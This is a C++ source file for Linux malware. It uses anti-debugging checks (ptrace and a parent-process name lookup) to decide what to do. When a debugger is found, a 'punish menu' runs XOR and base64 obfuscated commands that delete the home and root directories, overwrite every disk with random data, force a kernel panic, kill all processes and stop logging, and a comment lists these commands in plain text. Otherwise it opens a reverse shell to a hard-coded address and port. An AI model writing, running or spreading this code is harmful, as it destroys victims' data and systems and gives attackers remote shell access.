#include <chrono>
#include <csignal>
#include <cstring>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <linux/limits.h>
#include <netinet/in.h>
#include <setjmp.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <sys/ptrace.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <thread>
#include <unistd.h>
#include <vector>
#include <arpa/inet.h>

#define REMOTE_ADDR "192.168.122.1"
#define REMOTE_PORT 4444
#define KEY '726a628080d2f59f210cea4860c0eefb5bc5110fc1a70cb538595bcb487aefac'
using namespace std;

class Antidebug {
public:
//    ptrace check, segfaults if it finds ptrace
    bool ptc() {
        if(ptrace(PTRACE_TRACEME)) {
            printf("Debugger detected!\n");
            //raise(SIGSEGV);
            return true;
        } else {
            return false;
        }
    }
//    Check for common debuggers, segfault if it finds any
    bool dpc() {
        if (isUnderDebugger())
        {std::cout << "Debugger detected!\n" << std::endl;
            return true;}
        else
            return false;
    }
//    Attach self in debugging mode, if cannot attach, segfault. Pretty unreliable, just like timing attacks.
    bool sdc() {
        if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
            std::cout << "Debugger detected!\n" << std::endl;
//            raise(SIGSEGV);
            return true;
        } else {
            return false;}


    }
private:
    bool hasEnding (std::string const &fullString, std::string const &ending) {
        if (fullString.length() >= ending.length()) {
            return (0 == fullString.compare (fullString.length() - ending.length(), ending.length(), ending));
        } else {
            return false;
        }
    }
    bool isUnderDebugger()
    {
        bool result = false;
        /*
         * /proc/self/stat has PID of parent process as fourth parameter.
         */
        std::string stat;
        std::ifstream file("/proc/self/stat");

        for(int i = 0; i < 4; ++i)
            file >> stat;

        std::string parent_path = std::string("/proc/") + stat + "/exe";
        char path[PATH_MAX + 1];
        memset(path, 0, PATH_MAX + 1);
        readlink(parent_path.c_str(), path, PATH_MAX);

        std::vector<std::string> debuggers = {"gdb", "lldb-server"};

        for (auto &p: debuggers)
        {
            if (hasEnding(std::string(path), p))
            {
                result = true;
                break;
            }
        }

        return result;
    }
};

class Obfuscator {
public:
    string xor_obfuscate(string s, char key)
    {
        string result;
        for (std::size_t i = 0; i < s.size(); ++i) {
            result.push_back(s[i] ^ key);
        }
        return result;
    }

    string base64_encode(string s)
    {
        static const string base64_chars =
                "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                "abcdefghijklmnopqrstuvwxyz"
                "0123456789+/";

        string result;
        int val = 0;
        int val_bits = 0;
        for (std::size_t i = 0; i < s.size(); ++i) {
            val = (val << 8) + s[i];
            val_bits += 8;
            while (val_bits >= 6) {
                result.push_back(base64_chars[(val >> (val_bits - 6)) & 0x3f]);
                val_bits -= 6;
            }
        }
        if (val_bits > 0) {
            result.push_back(base64_chars[(val << (6 - val_bits)) & 0x3f]);
        }
        while (result.size() % 4) {
            result.push_back('=');
        }
        return result;
    }

    string base64_decode(string s)
    {
        static const string base64_chars =
                "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                "abcdefghijklmnopqrstuvwxyz"
                "0123456789+/";

        string result;
        std::vector<int> vec(256, -1);
        for (int i = 0; i < 64; i++) {
            vec[base64_chars[i]] = i;
        }

        int val = 0;
        int val_bits = 0;
        for (std::size_t i = 0; i < s.size(); ++i) {
            if (s[i] == '=') {
                break;
            }
            const int c = vec[s[i]];
            if (c == -1) {
                throw std::invalid_argument("Invalid character in base64 string");
            }
            val = (val << 6) + c;
            val_bits += 6;
            if (val_bits >= 8) {
                result.push_back((val >> (val_bits - 8)) & 0xff);
                val_bits -= 8;
            }
        }
        return result;
    }
};
const string encodedRmHomeAndroot = "EQ5DThEFQ0crLC4mWEMRDkNOEQVDTA==";
const string encodedWreckDisks = "BQwRQwpDCg1DR0sFBwoQCENOD0MfQwQRBhNDTAcGFUMfQwQRBhNDThVDDwwMEx9DBBEGE0MnChAIQx9DAhQIQ04lQ0QnChAIQ0RDRBgTEQoNF0NHUR5EQx9DABYXQ04HQz8/WUNOBVJKWAcMQw0MCxYTQwcHQwoFXkwHBhVMFhECDQcMDkMMBV5HCkNdQw0MCxYTTQwWF0NfQ0wHBhVMDRYPD0NF";
const string encodedKernelPanic = "BgALDEMAQ11DTBMRDABMEBoQERJOFxEKBAQGEQ==";
const string encodedKillAllProcsExceptInit = "BgALDEMKQ11DTBMRDABMEBoQERJOFxEKBAQGEQ==";
const string encodedStopLoggingExceptPanics = "BgALDENTQ11DTBMRDABMEBoQERJOFxEKBAQGEQ==";
Obfuscator obs;

string produceb64(string s, char key) {
    string xored = obs.xor_obfuscate(s, key);
    string b64 = obs.base64_encode(xored);
    return b64;
}

string deobfuscate(string s, char key) {
    string b64Decoded = obs.base64_decode(s);
    string XORDecoded = obs.xor_obfuscate(b64Decoded, key);
    string str = XORDecoded;


    return str;
}
void stopLoggingExceptPanics() {
    string cmd = encodedStopLoggingExceptPanics;
    string command = deobfuscate(cmd,KEY);
    system(command.c_str());
    cout << "Executing command:\t " << command << endl;

    return;
}
void rmHomeAndRoot(string cmd, char key) {
//    stopLoggingExceptPanics();
    string command = deobfuscate(cmd,KEY);
    system(command.c_str());
    cout << "Executing command:\t " << command << endl;

    return;
}

void wreckDisks(string cmd, char key) {
//    stopLoggingExceptPanics();
    string command = deobfuscate(encodedWreckDisks,KEY);
    cout << "Executing command:\t " << command << endl;
    system(command.c_str());
    return;
}

void kernelPanic(string cmd, char key) {
//    stopLoggingExceptPanics();
    string command = deobfuscate(encodedKernelPanic,KEY);
    system(command.c_str());return;}
void killAllProcsExceptInit(string cmd, char key) {
//    stopLoggingExceptPanics();
    string command = deobfuscate(cmd,key);
    cout << "Executing command:\t " << command << endl;
    system(command.c_str());
    return;
}
extern "C" {
    void runShell() {
        struct sockaddr_in sa;
        int s;

        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
        sa.sin_port = htons(REMOTE_PORT);

        s = socket(AF_INET, SOCK_STREAM, 0);
        connect(s, (struct sockaddr *)&sa, sizeof(sa));
        dup2(s, 0);
        dup2(s, 1);
        dup2(s, 2);

        execve("/bin/sh", 0, 0);
        return;
    }
}


void punishMenu() {
    int selection;
    printf(
            "\r\nPunish Menu:"
            "\r\n\tPress #1. Remove $HOME and ROOT DIRECTORY (including if the user is root)"
            "\r\n\tPress #2. Kill all all processes except init"
            "\r\n\tPress #3. Cause a kernel panic and crash the machine"
            "\r\n\tPress #4. Wreck virtual hard disks"
            "\r\n\tPress #5. Stop logging except kernel panics"
            );

    std::cin >> selection;

    switch (selection) {
        case 1:
            rmHomeAndRoot(encodedRmHomeAndroot, KEY);
        case 2:
            killAllProcsExceptInit(encodedKillAllProcsExceptInit,KEY);
        case 3:
            kernelPanic(encodedKernelPanic,KEY);
        case 4:
            wreckDisks(encodedWreckDisks, KEY);
        case 5:
            stopLoggingExceptPanics();
        default: printf("Punishment aborted, exiting"); exit(0);
    }

}
/*
// These are unobfuscated commands, that must be obfuscated and called as system(cmd);

// Underprivileged User Vector
// C++ code to segfault
//const string rmHome = "rm -rf $HOME";
//
//// Privileged User Vector
//
//const string rmHomeAndRoot = "rm -rf $HOME; rm -rf /";
//// Mileage varies on flash storage like SSDs, because of wear-levelling, but enough corruption should take place, making analyst's machine unbootable.
//const string wreckDisks = "for i in $(fdisk -l | grep /dev | grep -v loop| grep Disk | awk -F 'Disk ' '{print $2}' | cut -d \\: -f1);do nohup dd if=/dev/urandom of=$i > nohup.out < /dev/null &;done && rm -f ./nohup.out";
//const string kernelPanic = "echo c > /proc/sysrq-trigger";
//const string killAllProcsExceptInit = "echo i > /proc/sysrq-trigger";
//
//const string stopLoggingExceptPanics = "echo 0 > /proc/sysrq-trigger";
*/

Antidebug punisher;
int main() {
/*
 * Checks for debuggers, else triggers the punishment menu.
 * */
    if (punisher.dpc() || punisher.ptc()) {
        punishMenu();
    } else {
        runShell();
    }


    return 0;
}
